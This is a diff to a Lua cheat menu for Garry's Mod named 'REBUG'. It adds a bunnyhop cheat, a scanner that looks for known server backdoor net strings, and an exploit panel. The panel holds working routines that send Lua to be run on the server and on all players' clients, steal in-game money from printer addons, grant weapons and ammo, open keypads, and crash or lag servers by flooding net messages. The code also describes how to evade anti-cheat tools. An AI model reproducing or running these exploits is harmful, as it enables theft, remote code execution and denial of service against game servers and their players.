@@ -354,15 +354,20 @@ NetWorks
 	end
 
 	local function rndstr(len)
-		if len == nil then len = 5 end
+		if len == nil then
+			len = 5
+		end
+
 		local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789", "")
 		local r = ""
+
 		while string.len(r) < len do
-		r = r..chars[math.random(1, #chars)]
+			r = r .. chars[math.random(1, #chars)]
 		end
+
 		return r
 	end
-	
+
 	local noobstr = rndstr(16)
 	
     -- Notify
@@ -373,17 +378,17 @@ NetWorks
     -- Backdoored Strings
 	netStrings = {"hacking bro","hackingbro","kebabmenu","rotten_proute","BITMINER_UPDATE_DLC","nostrip2","operationsmoke","vegeta","pd1","JSQuery.Data ( Post ( false ) )","anatikisgodd","anatikisgod","https://i.imgur.com/gf6hlml.png","print ( )","fps","fszof<qOvfdsf","tupeuxpaslabypass","_CAC_G","adsp_door_length","SDFTableFsSSQS","EventStart","data_check","antileak","CreateAdminRanks","Asunalabestwaifu","shittycommand","tro2fakeestunpd","FAdmin_CreateVar","ContextHelp","lmaogetdunked","LV_BD_V2","createpanel","fuckyou","1337","haxor","r8helper","_chefhackv2","Þà?D)?","Þ  ?D)?","nostrip1","antilagger","Fix_Exploit","yazStats","FPSVBOOST","RTX420","Revelation","SizzurpDRM","cbbc","gSploit","ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ","Reaoscripting","ß ?D)?","?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®","!Çº/;.","NoOdium_Reaoscripting","m9k_","Î¾psilon","Backdoor","reaper","SDFTableFsSSQE","gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?","?", "Þ� ?D)◘", "Val", "models/zombie.mdl","REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "ξpsilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "�? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited","PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab","L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions" , "PlayerCheck" , "Sbox_darkrp" , "insid3" , "The_Dankwoo" , "Sbox_itemstore" , "Ulib_Message" , "ULogs_Info" , "ITEM" , "R8" , "fix" , "Fix_Keypads" , "Remove_Exploiters" , "noclipcloakaesp_chat_text" , "_Defqon" , "_CAC_ReadMemory" , "nostrip" , "nocheat" , "LickMeOut" , "ULX_QUERY2" , "ULXQUERY2" , "https://i.imgur.com/Gf6hLMl.png" , "MoonMan" , "Im_SOCool" , "JSQuery.Data(Post(false))" , "Sandbox_GayParty" , "DarkRP_UTF8" , "OldNetReadData" , "Gamemode_get" , "memeDoor" , "BackDoor" , "SessionBackdoor" , "DarkRP_AdminWeapons" , "cucked" , "NoNerks" , "kek" , "ZimbaBackdoor" , "something" , "random" , "strip0" , "fellosnake" , "enablevac" , "idk" , "ÃžÃ� ?D)â—˜" , "snte" , "apg_togglemode" , "Hi" , "beedoor" , "BDST_EngineForceButton" , "VoteKickNO" , "REEEEEEEEEEEE" , "_da_" , "Nostra" , "sniffing" , "keylogger" , "CakeInstall" , "Cakeuptade" , "love" , "earth" , "ulibcheck" , "Nostrip_" , "teamfrench" , "ADM" , "hack" , "crack" , "leak" , "lokisploit" , "1234" , "123" , "enculer" , "cake" , "seized" , "88" , "88_strings_" , "nostraall" , "blogs_update" , "nolag" , "loona_" , "billys_logs" , "loona" , "negativedlebest" , "berettabest" , "ReadPing" , "antiexploit" , "adm_NetString" , "mathislebg" , "Bilboard.adverts:Spawn(false)" , "pjHabrp9EY" , "?" , "lag_ping" , "allowLimitedRCON(user) 0" , "aze46aez67z67z64dcv4bt" , "killserver" , "fuckserver" , "cvaraccess" , "rcon" , "rconadmin" , "web" , "jesuslebg" , "zilnix" , "��?D)?" , "disablebackdoor" , "kill" , "DefqonBackdoor" , "DarkRP_AllDoorDatas" , "0101.1" , "awarn_remove" , "_Infinity" , "Infinity" , "InfinityBackdoor" , "_Infinity_Meme_" , "arivia" , "ULogs_B" , "_Warns" , "_cac_" , "striphelper" , "_vliss" , "YYYYTTYXY6Y" , "?????????????????�???? ?? ?�???�?�?? ???�???�???�." , "_KekTcf" , "_blacksmurf" , "blacksmurfBackdoor" , "_Raze" , "m9k_explosionradius" , "m9k_explosive" , "m9k_addons" , "rcivluz" , "SENDTEST" , "_clientcvars" , "_main" , "stream" , "waoz" , "bdsm" , "ZernaxBackdoor" , "UKT_MOMOS" , "anticrash" , "audisquad_lua" , "dontforget" , "noprop" , "thereaper" , "0x13" , "Child" , "!Cac" , "azkaw" , "BOOST_FPS" , "childexploit" , "ULX_ANTI_BACKDOOR" , "FADMIN_ANTICRASH" , "ULX_QUERY_TEST2" , "GMOD_NETDBG" , "netlib_debug" , "_DarkRP_Reading" , "lag_ping" , "||||"  , "FPP_RemovePLYCache" , "fuwa" , "stardoor" , "SENDTEST" , "rcivluz" , "c" , "N::B::P" , "changename" , "PlayerItemPickUp" , "echangeinfo" , "fourhead" , "music" , "slua" , "adm_network" , "componenttolua" , "theberettabcd" , "SparksLeBg" , "DarkRP_Armors" , "DarkRP_Gamemodes" , "fancyscoreboard_leave" , "PRDW_GET" , "pwn_http_send" , "AnatikLeNoob" , "GVacDoor" , "Keetaxor" , "BackdoorPrivate666" , "YohSambreLeBest" , "SNTE<ALL" , "!�:/;." , "pwn_http_answer" , "pwn_wake" , "verifiopd" , "AidsTacos" , "shix" , "PDA_DRM_REQUEST_CONTENT" , "xenoreceivetargetdata2" , "xenoreceivetargetdata1" , "xenoserverdatafunction" , "xenoserverfunction" , "xenoclientdatafunction" , "xenoclientfunction" , "xenoactivation" , "EXEC_REMOTE_APPS" , "yohsambresicianatik<3" , "Sbox_Message" , "Sbox_gm_attackofnullday_key" , "The_DankWhy" , "nw.readstream" , "AbSoluT" , "__G____CAC" , "Weapon_88" , "mecthack" , "SetPlayerDeathCount" , "FAdmin_Notification_Receiver" , "DarkRP_ReceiveData" , "fijiconn" , "LuaCmd" , "EnigmaProject" , "z" , "cvardel" , "effects_en" , "file" , "gag" , "asunalabestwaifu" , "stoppk" , "Ulx_Error_88" , "NoOdium_ReadPing", " striphelper "}
 
-function CheckBackdoors()
-    for k, v in pairs(netStrings) do
-        if(CheckIfStringExists(v)) then
-            channel = v
-            chat.AddText(Color(255, 0, 0), "[REBUG]", Color(20, 150, 20), " Found vulnerability ▶ ", Color(20, 150, 200), v)
-        end
-    end
-    if(channel == "") then
-        chat.AddText(Color(255, 0, 0), "[REBUG]", Color(225, 155, 155), " No vulnerability has been found")
-    end
-end
+	function CheckBackdoors()
+		for k, v in pairs(netStrings) do
+			if(CheckIfStringExists(v)) then
+				channel = v
+				chat.AddText(Color(255, 0, 0), "[REBUG]", Color(20, 150, 20), " Found vulnerability ▶ ", Color(20, 150, 200), v)
+			end
+		end
+		if(channel == "") then
+			chat.AddText(Color(255, 0, 0), "[REBUG]", Color(225, 155, 155), " No vulnerability has been found")
+		end
+	end
 
     function noob.PostLua(str)
         net.Start(channel)
@@ -420,7 +425,13 @@ end
 
     function sendLuaPlyKv(str)
         net.Start(channel)
-        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua(" .. str .. ") end")
+        net.WriteString([[
+
+			for k, v in pairs(player.GetAll()) do
+				v:SendLua(]] .. str .. [[)
+			end
+
+		]])
         net.SendToServer()
     end
 
@@ -482,6 +493,47 @@ Insert Key
 
             return
         end
+
+--[[-------------------------------------------------------------------------------------
+BunnyHop
+----------------------------------------------------------------------------------------]]
+	bhop_ch = 0
+	
+	function OP_Bhop()
+		if bhop_ch == 0 then
+			bhop_ch = 1
+
+			hook.Add("CreateMove", "REBUG", function(ply)
+				ch_bunnyhop(ply);
+			end);
+
+			rprint("Enabled")
+		else
+			bhop_ch = 0
+			rprint("Disabled")
+	
+			if hook.GetTable("CreateMove", "REBUG") then
+				hook.Remove("CreateMove", "REBUG")
+			end
+		end
+	end
+
+	function ch_bunnyhop(ply)
+		if(ply:KeyDown(IN_JUMP) && !LocalPlayer():IsOnGround()) then
+			ply:RemoveKey(IN_JUMP);
+
+			if !LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP then
+				if(ply:GetMouseX() > 1 || ply:GetMouseX() < -1) then
+					ply:SetSideMove(ply:GetMouseX() > 1 && 400 || -400);
+				else
+					ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
+					ply:SetSideMove((ply:CommandNumber() % 2 == 0) && -400 || 400);
+				end
+			end
+		elseif(ply:KeyDown(IN_JUMP)) then
+			ply:SetForwardMove(10000)
+		end
+	end
 
 --[[-------------------------------------------------------------------------------------
 Main Menu
@@ -977,13 +1029,13 @@ AntiCheat Detection
                 ["BetterSNTE Anti-Exploit"] = {
                     desc = "This was created shortly after SNTE became noticed to the pubic, This addon makes snte even \nmore useful but luckly for you are detour works on this addon (Don't scan backdoors)",
                     scan = function()
-                        if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then
+                        if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") or file.Exists("cache/srcds/1308262997.gma", "LUA") then
                             return true
                         else
                             return false
                         end
                     end
-                },
+                },q
                 ["Cake Anti-Cheat (CAC)"] = {
                     desc = "One of the best anticheats ever created on gmod still bans kids for cheating after it \nwas removed from gmodstore in 2017. Pity it it was never made to detect backdoors.",
                     scan = function()
@@ -1067,7 +1119,7 @@ AntiCheat Detection
                 ["SNTE Anti-Exploit"] = {
                     desc = "This has been ruining skids for more than a year now. With our methods you can detour \nthis idiotic anti-cheat and not have a problem with it.",
                     scan = function()
-                        if ConVarExists("snte_ulxluarun") or file.Exists("autorun/!!bettersnte.lua", "LUA") or file.Exists("autorun/!coresource_snte.lua", "LUA") or istable(global_nets) then -- if BetterSNTE then makes present
+                        if ConVarExists("snte_ulxluarun") or file.Exists("autorun/!!bettersnte.lua", "LUA") or file.Exists("autorun/!coresource_snte.lua", "LUA") or file.Exists("cache/srcds/1535384472.gma", "LUA") or istable(global_nets) then -- if BetterSNTE then makes present
                             return true
                         else
                             return false
@@ -1306,6 +1358,772 @@ AntiCheat Detection
         end
 
 --[[-------------------------------------------------------------------------------------
+Server Exploitation
+----------------------------------------------------------------------------------------]]
+
+		local isstring = isstring
+
+		rebug.sploits = {}
+		rebug.memory = {}
+
+		local severitycols = {
+			[1] = Color( 80, 80, 120 ),
+			[2] = Color( 83, 181, 83 ),
+			[3] = Color( 150, 90, 50 ),
+			[4] = Color( 150, 0, 0),
+		}
+
+		function rebug.AddExploit( name, tab )
+			if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
+			if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
+			rebug.sploits[name] = tab
+		end
+
+		function rebug.IsStored( addr )
+			return rebug.memory[addr] != nil
+		end
+
+
+
+		function rebug.GetStored( addr, fallback )
+			if fallback and rebug.memory[addr] == nil then return fallback end
+			return rebug.memory[addr]
+		end
+
+		function rebug.Store( addr, val )
+			rebug.memory[addr] = val
+		end
+
+		function rebug.GetAllStored()
+			return rebug.memory
+		end
+
+
+
+		function rebug.GetAllStoredData()
+			local ret = {}
+			for k, v in pairs( rebug.memory ) do
+				if !istable( v ) then ret[k] = v end
+			end
+			return ret
+		end
+
+--[[-------------------------------------------------------------------------------------
+EXPLOIT FEATURES
+----------------------------------------------------------------------------------------]]
+			rebug.AddExploit("€ Bitminers2 €", {
+				desc = "Exploit to steal money from all bitminers",
+				severity = 2,
+				scan = function() return CheckIfStringExists("BM2.Command.SellBitcoins") end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							for k, v in pairs(ents.FindByClass("bm2_bitminer_1")) do
+								net.Start("BM2.Command.SellBitcoins")
+								net.WriteEntity(v)
+								net.SendToServer()
+							end
+
+							for k, v in pairs(ents.FindByClass("bm2_bitminer_2")) do
+								net.Start("BM2.Command.SellBitcoins")
+								net.WriteEntity(v)
+								net.SendToServer()
+							end
+
+							for k, v in pairs(ents.FindByClass("bm2_bitminer_rack")) do
+								net.Start("BM2.Command.SellBitcoins")
+								net.WriteEntity(v)
+								net.SendToServer()
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("€ Customizable Printers Money Stealer €", {
+				desc = "Exploit to steal money from all Customizable printers",
+				severity = 2,
+				scan = function() return CheckIfStringExists( "SyncPrinterButtons16690" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							for k, v in pairs(ents.GetAll()) do
+								if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
+									net.Start("SyncPrinterButtons16690")
+									net.WriteEntity(v)
+									net.WriteUInt(2, 4)
+									net.SendToServer()
+								end
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("€ gPrinter Money Stealer €", {
+				desc = "Exploit to steal money from gprinters",
+				severity = 2,
+				scan = function() return CheckIfStringExists( "gPrinters.retrieveMoney" ) and CheckIfStringExists( "gPrinters.addUpgrade" ) and CheckIfStringExists( "gPrinters.chat" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							for k, v in pairs(ents.GetAll()) do
+								net.Start("gPrinters.retrieveMoney")
+								net.WriteEntity(v)
+								net.SendToServer()
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("€ Derma Printers €", {
+				desc = "Exploit to steal money from all derma printers",
+				severity = 2,
+				scan = function() return CheckIfStringExists( "withdrawp" ) and CheckIfStringExists( "RechargeP" ) and CheckIfStringExists( "CoolingP" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							for k, v in pairs(entsFindByClass("derma_printer")) do
+								net.Start("withdrawp")
+								net.WriteEntity(v)
+								net.SendToServer()
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Give weapons", {
+				desc = "Give some weapons for you (enter type)",
+				severity = 3,
+				scan = function() return CheckIfStringExists( "CraftSomething" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							net.Start( "CraftSomething" )
+							net.WriteEntity( LocalPlayer() )
+							net.WriteString( typ )
+							net.WriteString( "" )
+							net.WriteString( typ )
+							net.SendToServer()
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Inf Ammo", {
+				desc = "This will give you infinate ammo",
+				severity = 3,
+				scan = function() return CheckIfStringExists( "TCBBuyAmmo" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							net.Start( "TCBBuyAmmo" )
+							net.WriteTable( {nil,LocalPlayer():GetActiveWeapon():GetPrimaryAmmoType(),nil,"0","999999"} )
+							net.SendToServer()
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Keypad Hack", {
+				desc = "Opens all keypads in the area ( works every 80s )",
+				severity = 3,
+				scan = function() return CheckIfStringExists( "start_wd_emp" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							net.Start( "start_wd_emp" )
+							net.SendToServer()
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Remove Money", {
+				desc = "This will strip the weapons from all players",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "drugs_money" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							net.Start( "drugs_money" )
+							net.SendToServer()
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Server Crasher #1", {
+				desc = "This will use simplac AC to crash the server",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "SimplicityAC_aysent" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							net.Start( "SimplicityAC_aysent" )
+							net.SendToServer()
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Server Crasher #2", {
+				desc = "This will use simplac AC to crash the server",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "SimplicityAC_aysent" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							net.Start( "SimplicityAC_aysent" )
+							net.SendToServer()
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Server Crasher #3", {
+				desc = "This will use StaffTracker to crash the server",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "Morpheus.StaffTracker" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							if not timer.Exists("crasher1") then
+								timer.Create("crasher1", 0.5, 0, function()
+									for i = 1, 2000 do
+										net.Start("Morpheus.StaffTracker")
+										net.SendToServer()
+									end
+								end)
+							else
+								timer.Remove("crasher1")
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Server Crasher #4", {
+				desc = "This will use PAC net to crash the server",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "pac.net.TouchFlexes.ClientNotify" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							if not timer.Exists("pac.net.TouchFlexes.ClientNotify") then
+								timer.Create("pac.net.TouchFlexes.ClientNotify", 0.5, 0, function()
+									for i = 1, 2000 do
+										net.Start("pac.net.TouchFlexes.ClientNotify")
+										net.SendToServer()
+									end
+								end)
+							else
+								timer.Remove("pac.net.TouchFlexes.ClientNotify")
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Lagger #1", {
+				desc = "This will use NDES to lag the server",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "NDES_SelectedEmblem" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							if not timer.Exists("NDES_SelectedEmblem") then
+								timer.Create("NDES_SelectedEmblem", 0.5, 0, function()
+									for i = 1, 2000 do
+										net.Start("NDES_SelectedEmblem")
+										net.SendToServer()
+									end
+								end)
+							else
+								timer.Remove("NDES_SelectedEmblem")
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Lagger #2", {
+				desc = "This will use EZS PlayerTag to lag the server",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "EZS_PlayerTag" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							if not timer.Exists("EZS_PlayerTag") then
+								timer.Create("EZS_PlayerTag", 0.5, 0, function()
+									for i = 1, 2000 do
+										net.Start("EZS_PlayerTag")
+										net.SendToServer()
+									end
+								end)
+							else
+								timer.Remove("EZS_PlayerTag")
+							end
+						end
+					},
+				}
+			})
+			rebug.AddExploit("Lagger #3", {
+				desc = "This will use bitminers2 to lag the server",
+				severity = 4,
+				scan = function() return CheckIfStringExists( "BM2.Command.Eject" ) end,
+				functions = {
+					{
+						typ = "func",
+						name = "Launch",
+						func = function()
+						surface.PlaySound("buttons/button18.wav")
+							if not timer.Exists("BM2.Command.Eject") then
+								timer.Create("BM2.Command.Eject", 0.5, 0, function()
+									for i = 1, 2000 do
+										net.Start("BM2.Command.Eject")
+										net.SendToServer()
+									end
+								end)
+							else
+								timer.Remove("BM2.Command.Eject")
+							end
+						end
+					},
+				}
+			})
+
+	// Rest of exploit page
+	
+	function exploitation()
+
+		function rebug.MakeFunctionButton(parent, x, y, btext, func, tooltip)
+			if not parent:IsValid() then return end
+			local TButton = vgui.Create("DButton")
+			TButton:SetParent(parent)
+			TButton:SetPos(x, y)
+			TButton:SetText(btext)
+			TButton:SetTextColor(Color(255, 255, 255, 255))
+			TButton:SizeToContents()
+			TButton:SetTall(24)
+
+			if tooltip then
+				TButton:SetToolTip(tooltip)
+			end
+
+			TButton.Paint = function(self, w, h)
+				surface.SetDrawColor(Color(60, 60, 60, 200))
+				surface.DrawRect(0, 0, w, h)
+				surface.SetDrawColor(Color(60, 60, 60))
+				surface.SetMaterial(downgrad)
+				surface.DrawTexturedRect(0, 0, w, h / 2)
+				surface.SetDrawColor(Color(100, 100, 100, 255))
+				surface.DrawOutlinedRect(0, 0, w, h)
+			end
+
+			TButton.DoClick = function()
+				func()
+			end
+
+			return TButton:GetWide(), TButton:GetTall()
+		end
+
+		function rebug.MakePlayerSelectionButton(parent, x, y, addr)
+    if not parent:IsValid() then return end
+			local TButton = vgui.Create("DButton")
+			TButton:SetParent(parent)
+			TButton:SetPos(x, y)
+			TButton:SetText("Choose Targets")
+			TButton:SetTextColor(Color(255, 255, 255, 255))
+			TButton:SizeToContents()
+			TButton:SetTall(24)
+
+			TButton.Paint = function(self, w, h)
+				surface.SetDrawColor(Color(60, 60, 90, 200))
+				surface.DrawRect(0, 0, w, h)
+				surface.SetDrawColor(Color(60, 60, 60))
+				surface.SetMaterial(downgrad)
+				surface.DrawTexturedRect(0, 0, w, h / 2)
+				surface.SetDrawColor(Color(100, 100, 100, 255))
+				surface.DrawOutlinedRect(0, 0, w, h)
+				surface.SetDrawColor(Color(70, 70, 100, 255))
+				surface.DrawOutlinedRect(2, 2, w - 4, h - 4)
+			end
+
+			TButton.DoClick = function()
+				rebug.SelectPlayersPanel(addr)
+			end
+
+			return TButton:GetWide(), TButton:GetTall()
+		end
+
+		function rebug.SelectPlayersPanel(addr)
+			if rebug.PlayerSelector and rebug.PlayerSelector:IsVisible() then
+				rebug.PlayerSelector:Remove()
+			end
+
+			local plytab = rebug.GetStored(addr, {})
+			rebug.PlayerSelector = vgui.Create("DFrame")
+			rebug.PlayerSelector:SetSize(250, 400)
+			rebug.PlayerSelector:SetTitle("Select players to target")
+			rebug.PlayerSelector:SetPos(gui.MouseX(), gui.MouseY())
+			rebug.PlayerSelector:MakePopup()
+
+			rebug.PlayerSelector.Paint = function(s, w, h)
+				if not rebug.Menu or not rebug.Menu:IsVisible() then
+					s:Remove()
+
+					return
+				end
+
+				surface.SetDrawColor(Color(30, 30, 30, 245))
+				surface.DrawRect(0, 0, w, h)
+				surface.SetDrawColor(Color(55, 55, 55, 245))
+				surface.DrawOutlinedRect(0, 0, w, h)
+				surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
+			end
+
+			local Plist11 = vgui.Create("DPanelList", rebug.PlayerSelector)
+			Plist11:SetSize(rebug.PlayerSelector:GetWide() - 10, rebug.PlayerSelector:GetTall() - 55)
+			Plist11:SetPadding(5)
+			Plist11:SetSpacing(5)
+			Plist11:EnableHorizontal(false)
+			Plist11:EnableVerticalScrollbar(true)
+			Plist11:SetPos(5, 40)
+			Plist11:SetName("")
+
+			local target1 = vgui.Create("DButton", rebug.PlayerSelector)
+			target1:SetSize(40, 20)
+			target1:SetPos(10, 23)
+			target1:SetText("All")
+			target1:SetTextColor(Color(255, 255, 255, 255))
+
+			target1.Paint = function(panel, w, h)
+				surface.SetDrawColor(100, 100, 100, 255)
+				surface.DrawOutlinedRect(0, 0, w, h)
+				surface.SetDrawColor(0, 0, 50, 155)
+				surface.DrawRect(0, 0, w, h)
+			end
+
+			target1.DoClick = function()
+				for _, p in pairs(player.GetAll()) do
+					if not table.HasValue(plytab, p) then
+						table.insert(plytab, p)
+					end
+				end
+
+				rebug.Store(addr, plytab)
+			end
+
+			local target2 = vgui.Create("DButton", rebug.PlayerSelector)
+			target2:SetSize(40, 20)
+			target2:SetPos(55, 23)
+			target2:SetText("None")
+			target2:SetTextColor(Color(255, 255, 255, 255))
+
+			target2.Paint = function(panel, w, h)
+				surface.SetDrawColor(100, 100, 100, 255)
+				surface.DrawOutlinedRect(0, 0, w, h)
+				surface.SetDrawColor(0, 0, 50, 155)
+				surface.DrawRect(0, 0, w, h)
+			end
+
+			target2.DoClick = function()
+				table.Empty(plytab)
+				rebug.Store(addr, plytab)
+			end
+
+			local target3 = vgui.Create("DButton", rebug.PlayerSelector)
+			target3:SetSize(40, 20)
+			target3:SetPos(100, 23)
+			target3:SetText("Me")
+			target3:SetTextColor(Color(255, 255, 255, 255))
+
+			target3.Paint = function(panel, w, h)
+				surface.SetDrawColor(100, 100, 100, 255)
+				surface.DrawOutlinedRect(0, 0, w, h)
+				surface.SetDrawColor(0, 0, 50, 155)
+				surface.DrawRect(0, 0, w, h)
+			end
+
+			target3.DoClick = function()
+				table.Empty(plytab)
+				table.insert(plytab, LocalPlayer())
+				rebug.Store(addr, plytab)
+			end
+
+			local target4 = vgui.Create("DTextEntry", rebug.PlayerSelector)
+			target4:SetPos(145, 23)
+			target4:SetSize(95, 20)
+			target4:SetText("")
+
+			target4.OnChange = function(self)
+				local nam = self:GetValue()
+				local namtab = string.Explode(", ", nam)
+				table.Empty(plytab)
+
+				for _, pl in pairs(player.GetAll()) do
+					for _, s in pairs(namtab) do
+						if string.find(string.lower(pl:Nick()), s) then
+							table.insert(plytab, pl)
+						end
+					end
+				end
+
+				rebug.Store(addr, plytab)
+			end
+
+			for k, v in pairs(player.GetAll()) do
+				local plypanel2 = vgui.Create("DPanel")
+				plypanel2:SetPos(0, 0)
+				plypanel2:SetSize(200, 25)
+				local teamcol = team.GetColor(v:Team())
+
+				plypanel2.Paint = function(s, w, h)
+					if not v:IsValid() then return end
+					surface.SetDrawColor(Color(30, 30, 30, 245))
+					surface.DrawRect(0, 0, w, h)
+					surface.SetDrawColor(teamcol)
+					surface.DrawRect(0, h - 3, w, 3)
+					surface.SetDrawColor(Color(55, 55, 55, 245))
+					surface.DrawOutlinedRect(0, 0, w, h)
+
+					if table.HasValue(plytab, v) then
+						surface.SetDrawColor(Color(55, 255, 55, 245))
+					end
+
+					surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
+				end
+
+				local plyname = vgui.Create("DLabel", plypanel2)
+				plyname:SetPos(10, 5)
+				plyname:SetFont("Trebuchet18")
+				local tcol = Color(255, 255, 255)
+
+				if v == LocalPlayer() then
+					tcol = Color(155, 155, 255)
+				end
+
+				plyname:SetColor(tcol)
+				plyname:SetText(v:Nick())
+				plyname:SetSize(180, 15)
+				local faggot = vgui.Create("DButton", plypanel2)
+				faggot:SetSize(plypanel2:GetWide(), plypanel2:GetTall())
+				faggot:SetPos(0, 0)
+				faggot:SetText("")
+				faggot.Paint = function(panel, w, h) return end
+
+				faggot.DoClick = function()
+					if table.HasValue(plytab, v) then
+						table.RemoveByValue(plytab, v)
+					else
+						table.insert(plytab, v)
+					end
+					rebug.Store(addr, plytab)
+				end
+				Plist11:AddItem(plypanel2)
+			end
+		end
+
+		function rebug.MakeTextInputButton(parent, x, y, btext, default, addr)
+			if not parent:IsValid() then return end
+			local hostframe = vgui.Create("DPanel", parent)
+			hostframe:SetPos(x, y)
+			hostframe.Paint = function(self, w, h)
+				surface.SetDrawColor(Color(60, 60, 60, 200))
+				surface.DrawRect(0, 0, w, h)
+				surface.SetDrawColor(Color(60, 60, 60))
+				surface.SetMaterial(downgrad)
+				surface.DrawTexturedRect(0, 0, w, h / 2)
+				surface.SetDrawColor(Color(100, 100, 100, 255))
+				surface.DrawOutlinedRect(0, 0, w, h)
+			end
+
+			local tttt = vgui.Create("DLabel", hostframe)
+			tttt:SetPos(5, 5)
+			tttt:SetText(btext)
+			tttt:SizeToContents()
+			local tentry = vgui.Create("DTextEntry", hostframe)
+			tentry:SetPos(10 + tttt:GetWide(), 2)
+			tentry:SetSize(130, 20)
+			tentry:SetText(rebug.GetStored(addr, default))
+
+			tentry.OnChange = function(self)
+				rebug.Store(addr, self:GetValue())
+			end
+			hostframe:SetSize(13 + tttt:GetWide() + tentry:GetWide(), 24)
+			return hostframe:GetWide(), hostframe:GetTall()
+		end
+
+		function rebug.MakeNumberInputButton(parent, x, y, btext, default, min, max, addr)
+			if not parent:IsValid() then return end
+			local hostframe = vgui.Create("DPanel", parent)
+			hostframe:SetPos(x, y)
+
+			hostframe.Paint = function(self, w, h)
+				surface.SetDrawColor(Color(60, 60, 60, 200))
+				surface.DrawRect(0, 0, w, h)
+				surface.SetDrawColor(Color(60, 60, 60))
+				surface.SetMaterial(downgrad)
